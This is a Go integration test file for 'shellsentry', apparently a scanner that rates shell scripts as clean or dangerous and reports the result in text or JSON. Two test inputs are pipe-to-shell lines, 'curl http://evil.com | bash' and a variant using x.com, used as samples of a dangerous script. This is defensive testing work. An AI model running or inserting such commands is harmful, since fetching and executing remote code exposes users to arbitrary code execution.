// Integration tests for shellsentry binary
//
// Copyright 2025 3 Leaps, LLC
// Licensed under the Apache License, Version 2.0
//
// These tests exercise the compiled binary without network calls.

package main

import (
	"bytes"
	"os/exec"
	"strings"
	"testing"
)

// buildBinary builds the test binary once per test run
func buildBinary(t *testing.T) string {
	t.Helper()
	binary := "bin/shellsentry_test"
	cmd := exec.Command("go", "build", "-o", binary, ".")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("failed to build binary: %v\n%s", err, out)
	}
	return binary
}

func TestMain_VersionFlag(t *testing.T) {
	binary := buildBinary(t)

	cmd := exec.Command(binary, "--version")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("--version failed: %v\n%s", err, out)
	}

	output := string(out)
	if !strings.Contains(output, "shellsentry") {
		t.Errorf("--version output should contain 'shellsentry', got: %s", output)
	}
}

func TestMain_HelpFlag(t *testing.T) {
	binary := buildBinary(t)

	cmd := exec.Command(binary, "--help")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("--help failed: %v\n%s", err, out)
	}

	output := string(out)
	if !strings.Contains(output, "Usage:") {
		t.Errorf("--help should show usage, got: %s", output)
	}
}

func TestMain_AnalyzeCleanScript(t *testing.T) {
	binary := buildBinary(t)

	cmd := exec.Command(binary)
	cmd.Stdin = bytes.NewBufferString("#!/bin/bash\necho hello\n")
	out, err := cmd.CombinedOutput()

	// Clean script should exit 0
	if err != nil {
		t.Fatalf("clean script analysis failed: %v\n%s", err, out)
	}

	output := string(out)
	if !strings.Contains(output, "CLEAN") {
		t.Errorf("clean script should show CLEAN, got: %s", output)
	}
}

func TestMain_AnalyzeDangerousScript(t *testing.T) {
	binary := buildBinary(t)

	cmd := exec.Command(binary)
	cmd.Stdin = bytes.NewBufferString("#!/bin/bash\ncurl http://evil.com | bash\n")
	out, _ := cmd.CombinedOutput()

	// Should exit non-zero (we don't check exact code, just that it ran)
	output := string(out)
	if !strings.Contains(output, "DANGER") && !strings.Contains(output, "HIGH") {
		t.Errorf("dangerous script should show DANGER or HIGH findings, got: %s", output)
	}
}

func TestMain_JSONOutput(t *testing.T) {
	binary := buildBinary(t)

	cmd := exec.Command(binary, "--format", "json")
	cmd.Stdin = bytes.NewBufferString("#!/bin/bash\necho hello\n")
	out, err := cmd.CombinedOutput()

	if err != nil {
		t.Fatalf("JSON output failed: %v\n%s", err, out)
	}

	output := string(out)
	// Should be valid JSON (starts with {)
	trimmed := strings.TrimSpace(output)
	if !strings.HasPrefix(trimmed, "{") {
		t.Errorf("JSON output should start with '{', got: %s", output)
	}
	if !strings.Contains(output, `"risk_level"`) {
		t.Errorf("JSON output should contain risk_level field, got: %s", output)
	}
}

func TestMain_ExitCodes(t *testing.T) {
	binary := buildBinary(t)

	tests := []struct {
		name       string
		script     string
		wantExit   int
		wantOutput string
	}{
		{
			name:       "clean script exits 0",
			script:     "#!/bin/bash\necho hello\n",
			wantExit:   0,
			wantOutput: "CLEAN",
		},
		{
			name:       "dangerous script exits 3",
			script:     "#!/bin/bash\ncurl http://x.com | bash\n",
			wantExit:   3,
			wantOutput: "DANGER",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := exec.Command(binary)
			cmd.Stdin = bytes.NewBufferString(tt.script)
			out, err := cmd.CombinedOutput()

			exitCode := 0
			if err != nil {
				if exitErr, ok := err.(*exec.ExitError); ok {
					exitCode = exitErr.ExitCode()
				} else {
					t.Fatalf("unexpected error: %v", err)
				}
			}

			if exitCode != tt.wantExit {
				t.Errorf("exit code = %d, want %d\noutput: %s", exitCode, tt.wantExit, out)
			}

			if !strings.Contains(string(out), tt.wantOutput) {
				t.Errorf("output should contain %q, got: %s", tt.wantOutput, out)
			}
		})
	}
}
